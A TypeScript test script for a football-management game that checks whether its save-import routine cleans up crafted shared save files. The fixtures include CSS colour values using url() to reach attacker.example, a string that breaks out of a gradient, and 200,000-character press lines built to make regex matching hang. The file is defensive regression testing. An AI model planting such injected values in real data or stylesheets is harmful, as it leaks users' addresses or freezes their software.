/**
 * ---- A SHARED SAVE IS A STRANGER'S FILE (1.8.18) ----
 *
 * Players swap careers on the Discord, and Import reads whatever they were
 * sent. The 12 Oct 2026 security scan found two things a crafted file could
 * do, both fixed in migrate(), the one gate between a file and the game:
 *
 *   F1. FREEZE THE GAME. Press lines are matched back to their dictionary keys
 *       with patterns whose holes are lazy; a 200,000-character "question"
 *       backtracked for long enough to hang the import, and every later load.
 *   F3/F4. MAKE THE GAME CALL OUT. Club colours go straight into inline CSS,
 *       so a "colour" of url(https://...) made the WebView fetch it - the
 *       player's address handed to a stranger, in a game that sends nothing.
 *
 * And the ordinary saves must come through untouched.
 *
 * Run: npx vite-node scripts/importprobe.ts
 */
import { newGame } from '../src/game/newgame'
import { migrate, safeColours } from '../src/game/save'
import { recover, RECOVER_MAX } from '../src/game/pressmigrate'
import type { GameState } from '../src/game/model'
import { chunkEnd } from '../src/game/nativeshare'

let fails = 0
const ok = (c: boolean, what: string) => {
  console.log(`${c ? '  ok  ' : 'FAIL  '}${what}`)
  if (!c) fails++
}

const fresh = () => newGame('leicester', 'Import Probe', 4242)
const roundTrip = (g: GameState) => JSON.parse(JSON.stringify(g)) as GameState

console.log('\nF3/F4. colours that are not colours are put back')
{
  const g = roundTrip(fresh())
  const ids = Object.keys(g.clubs)
  const opp = ids.find(id => id !== g.userClubId)!
  const bundled = [...fresh().clubs[opp].colors]
  g.clubs[opp].colors = ['url("https://attacker.example/t?id=v1")', '#ffffff']
  const me = g.clubs[g.userClubId]
  const mine = [...me.colors]
  me.colors = ['red 0 65%, red 65% 100%), url("https://attacker.example/t?', '"), linear-gradient(red, red'] as [string, string]
  const third = ids.find(id => id !== opp && id !== g.userClubId)!
  ;(g.clubs[third] as unknown as { colors: unknown }).colors = 'not even a list'
  const m = migrate(g)
  ok(JSON.stringify(m.clubs[opp].colors) === JSON.stringify(bundled), 'a url() colour is replaced by the club\'s own colours')
  ok(JSON.stringify(m.clubs[g.userClubId].colors) === JSON.stringify(mine), 'a gradient-breaking pair is replaced too')
  ok(safeColours(m.clubs[third].colors), 'a colours field that is not a list becomes a real pair')
  const bad = Object.values(m.clubs).filter(c => !safeColours(c.colors))
  ok(bad.length === 0, `every club in the file now has plain hex colours (${bad.length} not)`)
  const any = JSON.stringify(Object.values(m.clubs).map(c => c.colors))
  ok(!/url\(|attacker/.test(any), 'nothing that could reach the network survives')
}

console.log('\nF1. a crafted press line cannot hang the import')
{
  const g = roundTrip(fresh())
  const huge = 'Final week. The room is three deep, half of them faces you\'ve never seen. ' + ', '.repeat(100_000) + 'x'
  const dashes = '-'.repeat(200_000)
  ;(g as unknown as { press: unknown[] }).press = [
    { id: 1, question: huge, options: [{ label: dashes, reaction: huge }], answerLabel: dashes, reaction: dashes },
    { id: 2, question: 'fine', options: 'not a list' },
    null,
    'a string where an object should be',
  ]
  const t = Date.now()
  const m = migrate(g)
  const ms = Date.now() - t
  ok(ms < 1000, `migrate() with 200,000-character press lines took ${ms} ms`)
  ok(Array.isArray(m.press), 'and the press list is still a list')
  ok(recover('x'.repeat(RECOVER_MAX + 1)) === null, `a line over ${RECOVER_MAX} characters is not matched at all`)
}

console.log('\nan honest save comes through unchanged')
{
  const g = fresh()
  const before = JSON.stringify(Object.fromEntries(Object.values(g.clubs).map(c => [c.id, c.colors])))
  const m = migrate(roundTrip(g))
  const after = JSON.stringify(Object.fromEntries(Object.values(m.clubs).map(c => [c.id, c.colors])))
  ok(before === after, 'every club keeps the colours it had')
  ok(Object.values(g.clubs).every(c => safeColours(c.colors)), 'and every bundled colour passes the check the import applies')
}

console.log('\nan exported save crosses the native bridge whole')
{
  // an emoji in a manager's name, straddling a piece boundary: each half of it
  // alone is not a character, and the native side would write '?'
  const size = 16
  const text = 'a'.repeat(size - 1) + '\u{1F3C9}' + 'b'.repeat(40) + '\u{1F600}'.repeat(30)
  const pieces: string[] = []
  for (let i = 0; i < text.length;) { const e = chunkEnd(text, i, size); pieces.push(text.slice(i, e)); i = e }
  const lone = pieces.filter(p => /[\uD800-\uDBFF]$/.test(p) || /^[\uDC00-\uDFFF]/.test(p))
  ok(lone.length === 0, `no piece starts or ends inside a character (${pieces.length} pieces)`)
  ok(pieces.join('') === text, 'and the pieces put back together are the save, byte for byte')
}

console.log(fails ? `\n${fails} FAILED` : '\nIMPORT PROBE PASSED: a stranger\'s save can neither hang the game nor make it call out')
process.exit(fails ? 1 : 0)
